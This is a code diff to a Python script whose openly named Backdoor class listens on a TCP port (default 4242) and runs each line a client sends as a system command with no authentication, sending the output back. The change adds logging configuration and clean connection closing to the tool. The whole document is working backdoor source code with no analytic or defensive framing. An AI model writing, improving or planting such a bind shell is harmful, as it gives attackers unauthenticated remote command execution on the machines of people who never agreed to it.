@@ -6,13 +6,26 @@ import sys
 import socket
 import argparse
 import subprocess
+import logging
 from threading import Thread
 
 
 class Server:
 
-    def __init__(self, backlog=5):
+    LOGGING_DFT_FORMAT = "(%(asctime)s %(levelname)s) %(message)s"
+    LOGGING_LEVELS = {
+        "critical": logging.CRITICAL,
+        "error":    logging.ERROR,
+        "warning":  logging.WARNING,
+        "info":     logging.INFO,
+        "debug":    logging.DEBUG
+    }
+
+    def __init__(self, backlog=5, log_level="info",
+                 log_format=LOGGING_DFT_FORMAT):
         self.backlog = backlog
+        logging.basicConfig(level=Server.LOGGING_LEVELS[log_level],
+                            format=log_format)
         self.servsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.servsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.should_stop = True
@@ -41,20 +54,27 @@ class Backdoor(Server):
     def handle_client(self, socket, address):
         f = socket.makefile()
         while not self.should_stop:
-            raw_line = f.readline()
-            if len(raw_line) > 0 and raw_line[-1] == '\n':
-                raw_line = raw_line[:-1]
-            out = subprocess.check_output(raw_line)
+            line = f.readline()
+            if len(line) == 0:
+                break
+            elif line[-1] == '\n':
+                line = line[:-1]
+            out = subprocess.check_output(line)
             socket.send(out)
+        socket.close()
+        logging.info("Connection with " + address[0] + ":" +
+                     str(address[1]) + " closed")
 
 
 def main():
     parser = argparse.ArgumentParser(description="zobb")
     parser.add_argument("-p", "--port", type=int, action="store", default=4242)
     parser.add_argument("--backlog", type=int, action="store", default=5)
+    parser.add_argument("--log", action="store", choices=Server.LOGGING_LEVELS,
+                        default="info")
     args = parser.parse_args(sys.argv[1:])
 
-    backdoor = Backdoor(backlog=args.backlog)
+    backdoor = Backdoor(backlog=args.backlog, log_level=args.log)
     backdoor.run(args.port)
 
 
